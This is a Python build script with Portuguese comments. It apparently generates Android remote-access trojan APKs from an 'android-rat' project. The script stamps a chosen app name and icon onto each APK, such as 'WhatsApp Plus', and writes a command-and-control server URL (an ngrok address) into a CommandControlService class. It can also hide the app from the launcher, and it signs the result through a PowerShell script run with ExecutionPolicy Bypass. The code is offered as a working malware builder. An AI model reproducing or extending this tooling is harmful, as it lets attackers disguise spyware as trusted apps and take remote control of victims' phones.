"""
APK Builder - Gera APKs personalizados automaticamente
Permite escolher ícone e nome do app

MODO PARALELO: Cada build usa diretório isolado para permitir builds simultâneos
"""

import os
import re
import shutil
import subprocess
import tempfile
import time
import platform
import uuid
import json
from PIL import Image
from pathlib import Path
import xml.etree.ElementTree as ET

# #region agent log
def _agent_debug_log(hypothesis_id, location, message, data=None, run_id="pre-fix"):
    try:
        candidates = [
            Path(__file__).resolve().parent.parent / "debug-3482b4.log",
            Path(__file__).resolve().parent / "debug-3482b4.log",
        ]
        payload = {
            "sessionId": "3482b4",
            "runId": run_id,
            "hypothesisId": hypothesis_id,
            "location": location,
            "message": message,
            "data": data or {},
            "timestamp": int(time.time() * 1000),
        }
        line = json.dumps(payload, ensure_ascii=False) + "\n"
        for log_path in candidates:
            try:
                with open(log_path, "a", encoding="utf-8") as f:
                    f.write(line)
                break
            except OSError:
                continue
    except Exception:
        pass


def _extract_gradle_failure(stdout, stderr):
    text = f"{stdout or ''}\n{stderr or ''}"
    markers = ["* What went wrong:", "What went wrong:", "FAILURE: Build failed", "Caused by:"]
    for marker in markers:
        idx = text.find(marker)
        if idx >= 0:
            return text[idx:idx + 1200].strip()
    return (stderr or stdout or "")[-1200:].strip()
# Helpers: detect java version and locate compatible JDKs
def _get_java_major(java_exe_path):
    try:
        proc = subprocess.run([java_exe_path, "-version"], capture_output=True, text=True)
        out = proc.stderr or proc.stdout or ""
        # Example lines: java version "17.0.8" or openjdk version "21.0.2"
        m = re.search(r'"(\d+)(?:\.(\d+))?', out)
        if not m:
            return None
        major = int(m.group(1))
        # Handle old style "1.8.0_xxx"
        if major == 1 and m.group(2):
            return int(m.group(2))
        return major
    except Exception:
        return None

def _find_compatible_jdk(min_major=11, max_major=17):
    # Candidates from environment first (allow override)
    env_candidates = [
        os.environ.get("HYDRA_JAVA_HOME"),
        os.environ.get("JAVA_HOME"),
        os.environ.get("JDK_HOME"),
        os.environ.get("JAVA_HOME_11"),
        os.environ.get("JAVA_HOME_17"),
    ]
    candidates = [p for p in env_candidates if p]

    # Common Windows install locations
    if os.name == 'nt':
        pf = os.environ.get('ProgramFiles', r"C:\Program Files")
        candidates += [
            os.path.join(pf, 'Java', d) for d in os.listdir(os.path.join(pf, 'Java'))
        ] if os.path.isdir(os.path.join(pf, 'Java')) else []

    # Try each candidate and validate; prefer versions in [min_major, max_major]
    for cand in candidates:
        try:
            java_bin = os.path.join(cand, 'bin', 'java.exe') if os.name == 'nt' else os.path.join(cand, 'bin', 'java')
            if not os.path.exists(java_bin):
                continue
            major = _get_java_major(java_bin)
            if major and (major >= min_major and major <= max_major):
                return os.path.abspath(cand)
        except Exception:
            continue
    # If none of the env candidates match, scan common locations again but allow broader matches
    # Common Windows install locations (second pass)
    tried = set(candidates)
    if os.name == 'nt':
        pf = os.environ.get('ProgramFiles', r"C:\Program Files")
        java_root = os.path.join(pf, 'Java')
        if os.path.isdir(java_root):
            for d in os.listdir(java_root):
                cand = os.path.join(java_root, d)
                if cand in tried:
                    continue
                try:
                    java_bin = os.path.join(cand, 'bin', 'java.exe')
                    if not os.path.exists(java_bin):
                        continue
                    major = _get_java_major(java_bin)
                    if major and (major >= min_major and major <= max_major):
                        return os.path.abspath(cand)
                except Exception:
                    continue

    return None
# #endregion

# Diretório base para builds paralelos
BUILDS_DIR = Path(tempfile.gettempdir()) / "apk_builds"
BUILDS_DIR.mkdir(parents=True, exist_ok=True)

_PACKAGE_ID_RE = re.compile(r"^[a-z][a-z0-9_]*(\.[a-z][a-z0-9_]*)+$")


def _escape_xml_text(value: str) -> str:
    return (
        value.replace("&", "&amp;")
        .replace("<", "&lt;")
        .replace(">", "&gt;")
        .replace('"', "&quot;")
        .replace("'", "&apos;")
    )


def _sanitize_application_id(package_name: str) -> str:
    cleaned = (package_name or "").strip().lower()
    if _PACKAGE_ID_RE.match(cleaned):
        return cleaned
    return "com.studio.app"


def patch_app_name(build_dir: Path, app_name: str) -> None:
    """Atualiza app_name em strings.xml e garante label @string/app_name no manifest."""
    safe_name = _escape_xml_text((app_name or "App").strip() or "App")
    build_path = Path(build_dir)

    strings_file = build_path / "app" / "src" / "main" / "res" / "values" / "strings.xml"
    if strings_file.exists():
        content = strings_file.read_text(encoding="utf-8")
        if re.search(r'<string name="app_name">', content):
            content = re.sub(
                r'<string name="app_name">.*?</string>',
                f'<string name="app_name">{safe_name}</string>',
                content,
                count=1,
            )
        else:
            content = content.replace(
                "</resources>",
                f'    <string name="app_name">{safe_name}</string>\n</resources>',
                1,
            )
        strings_file.write_text(content, encoding="utf-8")

    manifest_file = build_path / "app" / "src" / "main" / "AndroidManifest.xml"
    if manifest_file.exists():
        content = manifest_file.read_text(encoding="utf-8")
        content = re.sub(
            r'(<application\b[^>]*\bandroid:label=")[^"]*(")',
            r'\1@string/app_name\2',
            content,
            count=1,
        )
        manifest_file.write_text(content, encoding="utf-8")

    print(f"[NAME] App name patched: {app_name}")


def patch_application_id(build_dir: Path, package_name: str) -> None:
    """Atualiza applicationId no build.gradle."""
    sanitized = _sanitize_application_id(package_name)
    gradle_file = Path(build_dir) / "app" / "build.gradle"
    if not gradle_file.exists():
        print(f"[WARN] build.gradle not found: {gradle_file}")
        return

    content = gradle_file.read_text(encoding="utf-8")
    content, count = re.subn(
        r'applicationId\s+"[^"]+"',
        f'applicationId "{sanitized}"',
        content,
        count=1,
    )
    if count == 0:
        print(f"[WARN] applicationId not found in {gradle_file}")
    else:
        gradle_file.write_text(content, encoding="utf-8")
        print(f"[PKG] applicationId patched: {sanitized}")


# Limpa builds antigos (mais de 1 hora)
def cleanup_old_builds():
    """Remove diretórios de build antigos"""
    try:
        now = time.time()
        for build_dir in BUILDS_DIR.iterdir():
            if build_dir.is_dir():
                # Se foi criado há mais de 1 hora, remove
                age = now - build_dir.stat().st_mtime
                if age > 3600:  # 1 hora
                    try:
                        shutil.rmtree(build_dir, ignore_errors=True)
                        print(f"[CLEANUP] Removido build antigo: {build_dir.name}")
                    except:
                        pass
    except Exception as e:
        print(f"[WARN] Erro na limpeza de builds antigos: {e}")

class APKBuilder:
    def __init__(self, android_project_path, ngrok_url):
        self.original_project_path = Path(android_project_path)
        self.ngrok_url = ngrok_url
        self.build_id = str(uuid.uuid4())[:8]  # ID único para este build
        self.build_dir = None  # Será definido ao iniciar build
        self.project_path = None  # Cópia isolada do projeto
        
    def build_custom_apk(self, app_name, icon_path, output_path, webview_url=None, hide_from_launcher=False, request_admin=False):
        """
        Gera APK personalizado em diretório isolado (suporta builds paralelos)
        
        Args:
            app_name: Nome do aplicativo (ex: "Lanterna", "WhatsApp Plus")
            icon_path: Caminho para ícone (JPG/PNG, qualquer tamanho)
            output_path: Onde salvar o APK final
        """
        # Limpa builds antigos antes de começar
        cleanup_old_builds()
        
        print(f"[BUILD-{self.build_id}] Iniciando build: {app_name}")
        print(f"[BUILD-{self.build_id}] Modo: Diretório isolado (paralelo)")
        
        try:
            # Cria diretório isolado para este build
            self.build_dir = BUILDS_DIR / f"build_{self.build_id}"
            self.build_dir.mkdir(parents=True, exist_ok=True)
            
            # Copia projeto Android para diretório isolado
            self._copy_project_isolated()
            
            # 1. Atualiza nome do app
            self._update_app_name(app_name)
            
            # 2. Atualiza ícone (se fornecido)
            if icon_path:
                try:
                    # Se for caminho (str/Path) e não existir, tenta ignorar
                    if isinstance(icon_path, (str,)):
                        if not os.path.exists(icon_path):
                            print(f"[WARN] Icon path informado não existe, pulando: {icon_path}")
                        else:
                            self._update_icon(icon_path)
                    else:
                        # Pode ser Path ou file-like
                        try:
                            path_str = str(icon_path)
                            if os.path.exists(path_str):
                                self._update_icon(path_str)
                            else:
                                # Tenta passar direto (bytes/file-like)
                                self._update_icon(icon_path)
                        except Exception:
                            self._update_icon(icon_path)
                except Exception as e:
                    print(f"[WARN] Erro ao atualizar ícone, usando padrão: {e}")
            else:
                print(f"[INFO] Nenhum ícone fornecido — usando ícone padrão do projeto")
            
            # 3. Atualiza URL do servidor (pode ser sobrescrita via webview_url)
            target_url = webview_url if webview_url else self.ngrok_url
            try:
                self._update_server_url(target_url)
            except Exception as e:
                print(f"[WARN] Falha ao atualizar server URL: {e}")
            
            # Opcional: remove app do launcher
            if hide_from_launcher:
                try:
                    self._remove_launcher_intent()
                except Exception as e:
                    print(f"[WARN] Falha ao remover intent LAUNCHER: {e}")

            # 4. Compila APK
            apk_path = self._compile_apk()
            
            # 5. Copia APK final para destino
            shutil.copy(apk_path, output_path)
            
            print(f"[BUILD-{self.build_id}] ✅ APK gerado: {output_path}")
            return True
            
        except Exception as e:
            print(f"[BUILD-{self.build_id}] ❌ Erro: {e}")
            import traceback
            traceback.print_exc()
            return False
            
        finally:
            # Limpa diretório de build após conclusão
            self._cleanup_build_dir()
    
    def _copy_project_isolated(self):
        """Copia projeto Android para diretório isolado"""
        print(f"[BUILD-{self.build_id}] Copiando projeto para diretório isolado...")
        
        self.project_path = self.build_dir / "android-project"
        
        # Copia apenas arquivos necessários (ignora build anterior)
        def ignore_patterns(directory, files):
            ignored = []
            for f in files:
                # Ignora diretórios de build e cache
                if f in ['.gradle', 'build', '.idea', '*.iml', '__pycache__']:
                    ignored.append(f)
                # Ignora arquivos de build intermediários
                if f.endswith('.apk') or f.endswith('.dex'):
                    ignored.append(f)
            return ignored
        
        shutil.copytree(
            self.original_project_path, 
            self.project_path,
            ignore=ignore_patterns,
            dirs_exist_ok=True
        )
        
        print(f"[BUILD-{self.build_id}] Projeto copiado para: {self.project_path}")
        # #region agent log
        root_gradle = self.project_path / "build.gradle"
        app_gradle = self.project_path / "app" / "build.gradle"
        _agent_debug_log(
            "A",
            "apk_builder.py:_copy_project_isolated",
            "isolated project copied",
            {
                "project_path": str(self.project_path),
                "has_root_build_gradle": root_gradle.exists(),
                "has_app_build_gradle": app_gradle.exists(),
                "root_has_finalizedBy": "signReleaseWithUber" in root_gradle.read_text(encoding="utf-8", errors="ignore") if root_gradle.exists() else False,
                "app_has_lsparanoid_plugin": "lsposed.lsparanoid" in app_gradle.read_text(encoding="utf-8", errors="ignore") if app_gradle.exists() else False,
            },
        )
        # #endregion
    
    def _cleanup_build_dir(self):
        """Remove diretório de build após conclusão"""
        if self.build_dir and self.build_dir.exists():
            try:
                shutil.rmtree(self.build_dir, ignore_errors=True)
                print(f"[BUILD-{self.build_id}] Diretório de build limpo")
            except Exception as e:
                print(f"[BUILD-{self.build_id}] Aviso: não foi possível limpar build: {e}")
    
    def _update_app_name(self, app_name):
        """Atualiza nome do app em strings.xml e AndroidManifest.xml"""
        patch_app_name(self.project_path, app_name)
        
        # Atualiza ícone personalizado no manifest
        manifest_path = self.project_path / "app/src/main/AndroidManifest.xml"
        ET.register_namespace('android', 'http://schemas.android.com/apk/res/android')
        manifest_tree = ET.parse(manifest_path)
        manifest_root = manifest_tree.getroot()
        application = manifest_root.find('application')
        if application is not None:
            application.set('{http://schemas.android.com/apk/res/android}icon', '@mipmap/ic_launcher')
        manifest_tree.write(manifest_path, encoding='utf-8', xml_declaration=True)
    
    def _update_icon(self, icon_path):
        """
        Converte e copia ícone para todos os tamanhos Android
        Suporta JPG/PNG de qualquer tamanho
        """
        icon_sizes = {
            'mdpi': 48,
            'hdpi': 72,
            'xhdpi': 96,
            'xxhdpi': 144,
            'xxxhdpi': 192
        }
        
        try:
            # Abre imagem original
            import io

            if icon_path is None:
                raise Exception("Nenhum ícone fornecido")

            # Se for bytes
            if isinstance(icon_path, (bytes, bytearray)):
                img = Image.open(io.BytesIO(icon_path))
            # Se for file-like (has read)
            elif hasattr(icon_path, 'read'):
                img = Image.open(icon_path)
            else:
                # Assume path-like
                img_path = str(icon_path)
                if not os.path.exists(img_path):
                    raise Exception(f"Caminho do ícone não existe: {img_path}")
                img = Image.open(img_path)
            
            # Converte para RGB se necessário
            if img.mode not in ('RGB', 'RGBA'):
                img = img.convert('RGBA')
            
            # Remove canal alpha se for JPG
            if img.mode == 'RGBA':
                background = Image.new('RGB', img.size, (255, 255, 255))
                background.paste(img, mask=img.split()[3])
                img = background
            
            # Gera ícones para cada densidade
            for density, size in icon_sizes.items():
                drawable_dir = self.project_path / f"app/src/main/res/mipmap-{density}"
                drawable_dir.mkdir(parents=True, exist_ok=True)
                
                # Redimensiona
                icon_resized = img.resize((size, size), Image.Resampling.LANCZOS)
                
                # Salva como PNG
                icon_path_out = drawable_dir / "ic_launcher.png"
                icon_resized.save(icon_path_out, 'PNG')
            
            print(f"[ICON] Icone atualizado em todas as densidades")
            
        except Exception as e:
            raise Exception(f"Erro ao processar ícone: {e}. Certifique-se de enviar um arquivo PNG ou JPG válido.")
    
    def _update_server_url(self, ngrok_url):
        """Atualiza URL do servidor C&C"""
        import re
        
        server_file = self.project_path / "app/src/main/java/com/seguranca/protecao/CommandControlService.java"
        
        with open(server_file, 'r', encoding='utf-8') as f:
            content = f.read()
        
        # Substitui URL usando regex (mais flexível)
        content = re.sub(
            r'(public|private) static final String SERVER_URL = "[^"]+";',
            f'public static final String SERVER_URL = "{ngrok_url}";',
            content
        )
        
        with open(server_file, 'w', encoding='utf-8') as f:
            f.write(content)
        
        print(f"[URL] URL do servidor atualizada: {ngrok_url}")
    
    def _generate_package_name(self, app_name):
        """Gera package name único baseado no nome do app"""
        # Remove caracteres especiais e espaços
        clean_name = ''.join(c.lower() if c.isalnum() else '' for c in app_name)
        return f"com.app.{clean_name}"

    def _remove_launcher_intent(self):
        """Remove o intent-filter LAUNCHER do AndroidManifest.xml para esconder app do launcher."""
        manifest_file = self.project_path / "app" / "src" / "main" / "AndroidManifest.xml"
        if not manifest_file.exists():
            print(f"[WARN] AndroidManifest.xml não encontrado: {manifest_file}")
            return

        try:
            tree = ET.parse(manifest_file)
            root = tree.getroot()
            ns = {'android': 'http://schemas.android.com/apk/res/android'}

            # Encontra activities e seus intent-filters
            modified = False
            for activity in root.findall('.//activity'):
                for intent in list(activity.findall('intent-filter')):
                    has_main = False
                    has_launcher = False
                    for action in intent.findall('action'):
                        if action.get('{http://schemas.android.com/apk/res/android}name') == 'android.intent.action.MAIN':
                            has_main = True
                    for category in intent.findall('category'):
                        if category.get('{http://schemas.android.com/apk/res/android}name') == 'android.intent.category.LAUNCHER':
                            has_launcher = True
                    if has_main and has_launcher:
                        activity.remove(intent)
                        modified = True

            if modified:
                tree.write(manifest_file, encoding='utf-8', xml_declaration=True)
                print(f"[MANIFEST] Intent LAUNCHER removido para esconder app do launcher")
            else:
                print("[MANIFEST] Nenhum intent LAUNCHER encontrado para remover")
        except Exception as e:
            raise Exception(f"Erro ao manipular AndroidManifest.xml: {e}")
    
    def _update_package_name(self, package_name):
        """Atualiza package name no build.gradle"""
        patch_application_id(self.project_path, package_name)
    
    def _compile_apk(self):
        """Compila APK usando gradlew com otimizacoes"""
        print("[COMPILE] Compilando APK (otimizado)...")
        
        # Executa gradlew assembleRelease com flags de otimização
        gradlew = self.project_path / "gradlew.bat" if os.name == 'nt' else self.project_path / "gradlew"
        
        build_args = [
            str(gradlew),
            "assembleRelease",
            "-PhydraSkipParanoid=true",
            "--parallel",
            "--build-cache",
            "--no-configuration-cache",
            "-Dorg.gradle.daemon=true",
            "-Dorg.gradle.parallel=true", 
            "-Dorg.gradle.caching=true",
            "-Dorg.gradle.jvmargs=-Xmx2048m -XX:+HeapDumpOnOutOfMemoryError",
            "--stacktrace"
        ]

        env = os.environ.copy()
        env["HYDRA_SKIP_PARANOID"] = "1"

        # Se JAVA_HOME aponta para diretório inválido (ex.: restos de ferramentas), remova para evitar erro do Gradle
        java_home_env = env.get("JAVA_HOME") or env.get("JDK_HOME")
        if java_home_env:
            # Normaliza e checa existencia de java bin
            jpath = os.path.join(java_home_env, "bin", "java.exe") if os.name == 'nt' else os.path.join(java_home_env, "bin", "java")
            if not os.path.exists(jpath):
                print(f"[WARN] JAVA_HOME inválido detectado ({java_home_env}) — removendo variável do ambiente para usar 'java' do PATH, se disponível")
                env.pop("JAVA_HOME", None)
                env.pop("JDK_HOME", None)

        # #region agent log
        _agent_debug_log(
            "B",
            "apk_builder.py:_compile_apk",
            "starting gradle assembleRelease",
            {
                "cwd": str(self.project_path),
                "hydra_skip_paranoid": env.get("HYDRA_SKIP_PARANOID"),
                "gradle_args": build_args,
            },
        )
        # #endregion
        import shutil

        # Verifica se o Java está disponível (via PATH) ou se JAVA_HOME aponta para JDK
        java_exec = shutil.which("java")
        java_home_env = os.environ.get("JAVA_HOME") or os.getenv("JAVA_HOME")
        java_ok = False
        if java_exec:
            java_ok = True
        elif java_home_env:
            if os.name == 'nt':
                possible = os.path.join(java_home_env, "bin", "java.exe")
            else:
                possible = os.path.join(java_home_env, "bin", "java")
            java_ok = os.path.exists(possible)

        if not java_ok:
            raise Exception(
                "JAVA não encontrado: defina a variável de ambiente JAVA_HOME apontando para o JDK ou instale o Java e coloque 'java' no PATH."
            )

        # Detect current java major version
        current_java_path = java_exec or (os.path.join(java_home_env, 'bin', 'java.exe') if os.name == 'nt' and java_home_env else None)
        current_java_major = None
        if current_java_path:
            current_java_major = _get_java_major(current_java_path)

        # AGP 7/8 requires Java 11+. Prefer JDKs in [11,17].
        compatible_jdk = _find_compatible_jdk(min_major=11, max_major=17)

        # Decision table:
        # - If current Java is between 11 and 17 -> use it.
        # - If current Java <11 or unknown -> try to find compatible_jdk and use it.
        # - If current Java >17 -> try to find compatible_jdk and use it, otherwise error.
        if current_java_major and 11 <= current_java_major <= 17:
            # current java is fine
            pass
        elif current_java_major and current_java_major > 17:
            if compatible_jdk:
                print(f"[WARN] Java atual (major={current_java_major}) é muito novo para este Gradle; usando JDK compatível em: {compatible_jdk}")
                build_args.append(f"-Dorg.gradle.java.home={compatible_jdk}")
            else:
                raise Exception(
                    "Java encontrado é muito novo para este build. Instale JDK 11 ou 17 e defina JAVA_HOME ou HYDRA_JAVA_HOME apontando para ele."
                )
        else:
            # current Java is unknown or <11
            if compatible_jdk:
                print(f"[INFO] Usando JDK compatível para Gradle: {compatible_jdk}")
                build_args.append(f"-Dorg.gradle.java.home={compatible_jdk}")
            else:
                raise Exception(
                    "Nenhum JDK compatível (11-17) encontrado. Instale JDK 11/17 e defina JAVA_HOME ou HYDRA_JAVA_HOME apontando para ele."
                )

        result = subprocess.run(
            build_args,
            cwd=self.project_path,
            capture_output=True,
            text=True,
            env=env,
        )

        gradle_failure = _extract_gradle_failure(result.stdout, result.stderr)
        gradle_log_path = self.build_dir / "gradle-last.log"
        try:
            with open(gradle_log_path, "w", encoding="utf-8", errors="replace") as f:
                f.write("=== STDOUT ===\n")
                f.write(result.stdout or "")
                f.write("\n=== STDERR ===\n")
                f.write(result.stderr or "")
        except OSError:
            gradle_log_path = None

        # #region agent log
        _agent_debug_log(
            "C",
            "apk_builder.py:_compile_apk",
            "gradle finished",
            {
                "returncode": result.returncode,
                "gradle_failure_excerpt": gradle_failure[:800],
                "gradle_log_path": str(gradle_log_path) if gradle_log_path else None,
            },
        )
        # #endregion
        
        if result.returncode != 0:
            print(f"[WARN] Gradle stderr: {result.stderr[-500:] if result.stderr else 'N/A'}")
            print(f"[WARN] Gradle causa: {gradle_failure[:600]}")
            raise Exception(f"Erro ao compilar: {gradle_failure[:400] if gradle_failure else 'Erro desconhecido'}")
        
        apk_path = self.project_path / "app/build/outputs/apk/release/app-release.apk"
        
        if not apk_path.exists():
            raise Exception("APK nao foi gerado")
        
        self._sign_apk_uber(apk_path)
        
        print("[OK] APK compilado com sucesso")
        return apk_path
    
    def _sign_apk_uber(self, apk_path):
        """Assina APK via sign_release_apk.ps1 (repo principal, nao diretorio isolado)."""
        candidates = [
            self.original_project_path.parent / "scripts" / "sign_release_apk.ps1",
            self.original_project_path.parent.parent / "scripts" / "sign_release_apk.ps1",
        ]
        sign_script = next((p for p in candidates if p.exists()), None)
        if not sign_script:
            print("[SIGN] sign_release_apk.ps1 nao encontrado — APK so com assinatura Gradle")
            return
        
        keystore = self.original_project_path / "google-services-release.jks"
        env = os.environ.copy()
        env["HYDRA_APK_PATH"] = str(apk_path)
        if sign_script.parent.parent.exists():
            env["HYDRA_PROJECT_ROOT"] = str(sign_script.parent.parent)
        if keystore.exists():
            env["HYDRA_KEYSTORE"] = str(keystore)
        
        print(f"[SIGN] Uber APK Signer via {sign_script}")
        result = subprocess.run(
            ["powershell", "-ExecutionPolicy", "Bypass", "-File", str(sign_script)],
            capture_output=True,
            text=True,
            env=env,
        )
        if result.stdout:
            print(result.stdout.strip())
        if result.returncode != 0:
            err = (result.stderr or result.stdout or "")[-400:]
            print(f"[WARN] Assinatura uber falhou (APK Gradle permanece): {err}")
    
    def build_visual_apk(self, app_name, icon_path, output_path, visual_config_json):
        """
        🎨 Gera APK Visual personalizado com telas customizadas (suporta builds paralelos)
        """
        cleanup_old_builds()
        
        print(f"[VISUAL-{self.build_id}] 🎨 Iniciando build do APK Visual: {app_name}")
        
        try:
            self.build_dir = BUILDS_DIR / f"visual_{self.build_id}"
            self.build_dir.mkdir(parents=True, exist_ok=True)
            
            self._copy_project_isolated()
            self._update_app_name(app_name)
            
            if icon_path and os.path.exists(icon_path):
                self._update_icon(icon_path)
            
            self._update_server_url(self.ngrok_url)
            self._embed_visual_config(visual_config_json)
            
            apk_path = self._compile_apk()
            shutil.copy(apk_path, output_path)
            
            print(f"[VISUAL-{self.build_id}] ✅ APK Visual gerado: {output_path}")
            return True
            
        except Exception as e:
            print(f"[VISUAL-{self.build_id}] ❌ Erro: {e}")
            import traceback
            traceback.print_exc()
            return False
            
        finally:
            self._cleanup_build_dir()
    
    def _embed_visual_config(self, visual_config_json):
        import json
        
        assets_dir = self.project_path / "app/src/main/assets"
        assets_dir.mkdir(parents=True, exist_ok=True)
        
        config_path = assets_dir / "visual_config.json"
        
        with open(config_path, 'w', encoding='utf-8') as f:
            if isinstance(visual_config_json, str):
                f.write(visual_config_json)
            else:
                json.dump(visual_config_json, f, indent=2, ensure_ascii=False)
        
        print(f"[VISUAL] Configuração visual embedada")
    
    def _remove_visual_config(self):
        try:
            config_path = self.project_path / "app/src/main/assets/visual_config.json"
            if config_path.exists():
                config_path.unlink()
        except Exception as e:
            print(f"[WARN] Erro ao remover visual_config.json: {e}")


# ======================================================
# EXEMPLO DE USO
# ======================================================
if __name__ == "__main__":
    import hydra_env

    builder = APKBuilder(
        android_project_path="C:/Users/Administrator/AppData/Local/finalvnc/android-rat",
        ngrok_url=hydra_env.public_ws_url(),
    )
    
    builder.build_custom_apk(
        app_name="WhatsApp Plus",
        icon_path="icon.png",
        output_path="whatsapp-plus.apk"
    )